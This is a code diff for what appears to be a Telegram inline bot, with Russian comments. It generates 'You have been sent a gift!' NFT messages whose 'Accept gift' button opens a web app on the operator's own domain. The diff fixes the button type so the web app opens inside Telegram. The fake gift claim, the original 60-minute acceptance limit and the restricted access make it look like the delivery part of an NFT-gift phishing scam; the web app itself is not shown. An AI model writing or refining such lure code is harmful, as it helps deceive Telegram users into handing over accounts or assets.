@@ -172,11 +172,11 @@ async def inline_handler(event):
         await event.answer([], switch_pm="Доступ ограничен.", switch_pm_param="no_access")
         return
 
-    if not event.text or not event.text.strip().startswith("http"):
-        await event.answer([], switch_pm="Введите ссылку на NFT подарок...", switch_pm_param="help")
+    input_text = event.text.strip()
+    if not input_text.startswith("http"):
+        await event.answer([], switch_pm="Введите ссылку на NFT...", switch_pm_param="help")
         return
 
-    input_text = event.text.strip()
     try:
         nft_name = input_text.split('/')[-1].replace('-', ' ').title()
     except:
@@ -185,8 +185,8 @@ async def inline_handler(event):
     timestamp = int(time.time())
     web_url = f"https://{DOMAIN}/?nft_url={urllib.parse.quote(input_text)}&t={timestamp}"
     
-    builder = event.builder
-    
+    # Текст сообщения: Название NFT теперь кликабельная ссылка
+    # Мы используем Markdown-разметку [текст](ссылка)
     message_text = (
         f"🎁 **Вам отправили подарок!**\n\n"
         f"NFT: [{nft_name}]({input_text})\n\n"
@@ -196,18 +196,19 @@ async def inline_handler(event):
         "Нажмите кнопку ниже, чтобы принять 👇"
     )
 
-    result = event.builder.article(
-        title=f"🎁 Подарить подарок: {nft_name}",
-        description="Лимит принятия: 60 минут",
-        text=message_text,
-        link_preview=False,
-        buttons=[
-            [types.KeyboardButtonWebView(text="Принять подарок 🎁", url=web_url)],
-            [types.KeyboardButtonUrl(text="Посмотреть подарок", url=input_text)]
-        ]
-    )
-
-    await event.answer([result])
+    # Используем InputRow и InputKeyboardButtonWebApp для инлайн-ответа
+    # Это решает проблему открытия в браузере и ошибку ButtonTypeInvalidError
+    await event.answer([
+        event.builder.article(
+            title=f"🎁 Подарить: {nft_name}",
+            text=message_text,
+            link_preview=False,
+            buttons=[
+                [types.InputKeyboardButtonWebApp(text="Принять подарок 🎁", url=web_url)],
+                [types.InputKeyboardButtonUrl(text="Посмотреть подарок", url=input_text)]
+            ]
+        )
+    ])
 
 # --- ОБРАБОТЧИКИ КОМАНД ---
 
